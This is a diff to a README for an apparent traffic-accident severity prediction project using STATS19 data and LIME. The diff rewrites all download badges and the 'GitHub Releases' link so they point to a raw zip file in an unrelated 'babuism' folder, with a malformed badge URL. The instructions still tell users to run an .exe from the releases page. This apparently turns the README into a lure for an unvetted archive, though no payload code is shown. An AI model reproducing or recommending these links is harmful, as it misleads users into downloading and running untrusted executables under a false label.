@@ -1,6 +1,6 @@
 # 🚦 Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI - Predict Traffic Accident Severity Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-lightblue.svg)](https://github.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/releases)
+[![Download](https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip%https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip)](https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip)
 
 ## 📦 Overview
 This project predicts traffic accident severity using the 2023 STATS19 dataset. It employs machine learning techniques and LIME to forecast outcomes such as 'Fatal' or 'Slight'. Additionally, it provides clear explanations for its predictions, helping enhance road safety.
@@ -9,7 +9,7 @@ This project predicts traffic accident severity using the 2023 STATS19 dataset. 
 To get started, you will need to download the application. Follow the steps below.
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/releases).
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the most recent version of the application. Look for a file that ends with `.exe` (for Windows) or a similar executable file for your operating system.
@@ -68,4 +68,4 @@ For questions or support, feel free to open an issue in the repository, or conta
 ## 👤 License
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-[![Download](https://img.shields.io/badge/Download%20Now-lightblue.svg)](https://github.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/releases)
+[![Download](https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip%https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip)](https://raw.githubusercontent.com/osoadsd/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI/main/babuism/Feature-Engineering-Framework-For-Traffic-Accident-Prediction-using-XAI.zip)
